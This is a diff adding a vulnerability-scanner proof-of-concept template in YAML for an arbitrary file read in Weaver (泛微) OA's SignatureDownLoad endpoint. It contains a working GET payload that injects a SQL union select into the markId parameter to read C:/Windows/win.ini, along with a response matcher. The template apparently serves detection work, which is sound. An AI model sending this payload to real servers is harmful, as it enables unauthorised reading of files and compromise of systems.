@@ -1,0 +1,17 @@
+id: poc-yaml-weaver-signature-download-arbitrary-file-read
+info:
+  name: 泛微OA SignatureDownLoad 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  - 两高一弱
+  finger: weaver
+  osprey-id: vb_2022_0090
+requests:
+- method: GET
+  path: /weaver/weaver.file.SignatureDownLoad?markId=1+union+select+'C:/Windows/win.ini'
+  expression: 'contains(body, "; for 16-bit app support") && !contains(body, "<")
+
+    '
+variables: {}
+transport: http
